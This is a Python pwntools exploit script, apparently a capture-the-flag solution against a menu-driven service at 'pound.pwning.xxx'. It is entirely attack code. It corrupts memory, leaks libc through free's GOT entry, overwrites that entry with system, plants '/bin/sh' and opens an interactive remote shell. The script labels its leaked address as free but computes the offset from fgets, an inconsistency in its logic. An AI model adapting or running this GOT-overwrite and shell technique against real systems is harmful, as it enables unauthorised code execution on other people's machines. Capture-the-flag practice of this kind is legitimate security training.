from pwn import *

host = 'localhost'
port = 4000

# host = 'pound.pwning.xxx'
# port = 9765


conn = remote(host,port)
# context.log_level = 'debug'

LIBCPATH = "./libc.so.6"
free_in_got = 0x0804B014
valid_bss_addr = 0x0804c87c


def greetings(a,b):
	conn.recvuntil("state:")
	conn.sendline(a)
	conn.recvuntil("state:")
	conn.sendline(b)
	conn.recvuntil("Choice:")

def initialize(amount):
	conn.sendline("1")
	conn.recvuntil("in: ")
	conn.sendline(str(amount))
	conn.recvuntil("Choice: ")

def propagate_fw(amount):
	conn.sendline("2")
	conn.recvuntil("propagate:")
	conn.sendline(str(amount))
	conn.recvuntil("Choice:")

def propagate_bw(amount):
	conn.sendline("3")
	conn.recvuntil("propagate:")
	conn.sendline(str(amount))
	conn.recvuntil("Choice:")

def first_step(address):
	fake_address = address + 100
	initialize(fake_address)
	propagate_fw(fake_address)
	initialize(0)
	p = log.progress('Propagating_fw')
	for i in xrange(256):
		p.status("prop " + str(i) + " of 256")
		propagate_fw(fake_address)
	propagate_fw(100)
	p.success("Finish")
	conn.sendline("0")
	conn.recvuntil("PSA: ")
	data = conn.recvuntil("State")
	conn.recvuntil("Choice:")
	leak = data[4:8]
	leak = unpack(leak, 'all', 'little', False)
	log.info("Free in libc at runtime: " + hex(leak))
	#LIBCOFFSET
	free_in_libc_at_runtime = leak
	system_in_libc_at_runtime = free_in_libc_at_runtime + system_offset
	log.info("System in libc: " + hex(system_in_libc_at_runtime))
	what = (p32(system_in_libc_at_runtime) + p32(leak) )
	conn.sendline("4")
	conn.recvuntil("announcement:")
	conn.sendline(str(len(what)+1))
	conn.sendline(what)
	conn.recvuntil("Choice:")

def free_pointer(address):
	p = log.progress('Propagating_bw')
	for i in xrange(260):
		p.status("prop " + str(i) + " of 260")
		propagate_bw(address)
	p.success("Finish")
	initialize(0)

def second_step(address):
	initialize(address)
	propagate_fw(address)
	initialize(0)
	p = log.progress('Propagating')
	for i in xrange(256):
		p.status("prop " + str(i) + " of 256")
		propagate_fw(address)
	p.success("Finish")
	what = "/bin/sh\x00"
	conn.sendline("4")
	conn.recvuntil("announcement:")
	conn.sendline(str(len(what)+1))
	conn.sendline(what)
	conn.recvuntil("Choice:")

def final_step():
	conn.sendline("4")
	conn.recvuntil("announcement:")
	conn.sendline("1000")

def python_step():
	conn.recvuntil("Quit")
	conn.sendline("2")
	conn.recvuntil("Size:")
	conn.sendline("258")
	conn.recvuntil("Size:")
	conn.sendline("N;k")


if __name__ == "__main__":
	python_step()
	greetings("","")

	e = elf.ELF(LIBCPATH)
	system_offset = e.symbols['system'] - e.symbols['fgets']		

	first_step(free_in_got)
	free_pointer(free_in_got)
	second_step(valid_bss_addr)
	final_step()

	conn.interactive()


